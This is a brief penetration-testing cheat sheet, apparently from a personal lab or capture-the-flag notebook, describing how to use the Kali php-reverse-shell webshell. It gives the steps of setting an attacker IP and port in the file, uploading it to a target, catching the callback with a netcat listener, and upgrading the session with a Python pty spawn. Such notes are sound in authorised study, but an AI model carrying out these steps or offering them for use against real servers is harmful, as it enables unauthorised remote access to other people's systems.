# php revese shell
Located in `/usr/share/webshells/php/php-reverse-shell.php`

Change port and ip and then upload the file.
```bash
$ip = '10.10.15.56';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Set up a netcat listener on the same port.
```bash
$ nc -lvnp 1234
```

In order to have a functional shell can execute this command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
